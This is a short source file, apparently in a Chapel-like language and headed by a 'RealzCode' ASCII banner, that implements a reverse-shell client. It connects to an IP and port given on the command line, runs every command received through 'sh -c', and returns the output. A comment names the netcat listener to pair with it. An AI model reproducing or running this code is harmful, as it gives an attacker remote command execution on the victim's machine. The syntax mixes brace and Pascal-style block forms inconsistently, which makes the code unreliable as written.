use SysIO; // nc -l -p 13377

const We: string =
  """  _____            _      _____          _      
 |  __ \          | |    / ____|        | |     
 | |__) |___  __ _| |___| |     ___   __| | ___ 
 |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \
 | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
 |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|
""";

var clientIp: string;
var ip: string;
var po: int;

proc ExecuteCommand(cmd: string): string {
  var output: string;
  var process: Process;
  
  process = new Process();
  process.args = ["sh", "-c", cmd];
  process.outputMode = ProcessOutput.pipe;
  process.start();
  while true {
    var line = process.readLine();
    if line == "" then break;
    output += line;
  }
  process.close();
  return output;
}

begin
  clientIp = hostname();
  ip = "127.0.0.1"; // Default IP address
  po = 8080; // Default port

  if numArgs() < 2 then
    writeln("Please provide the IP address and port as command-line arguments.");
    halt(1);
  else
    ip = args(1);
    po = toInt(args(2));
  end if;

  writeln(We);
  writeln("Client IP:", clientIp);

  writeln("Connecting to ", ip, ":", po);
  var socket = TcpSocket();
  try
    socket.connect(ip, po);
  catch e: Exception do
    writeln("Connection error:", e.msg);
    halt(1);
  end try;

  socket.writeln(We);

  while true {
    socket.write(" $ ");
    var cmd = socket.readln();
    cmd = trim(cmd);

    if cmd == "exit" then
      break;
    end if;

    var cmdOutput = ExecuteCommand(cmd);
    socket.writeln(cmdOutput);
  end while;

  socket.close();
end;
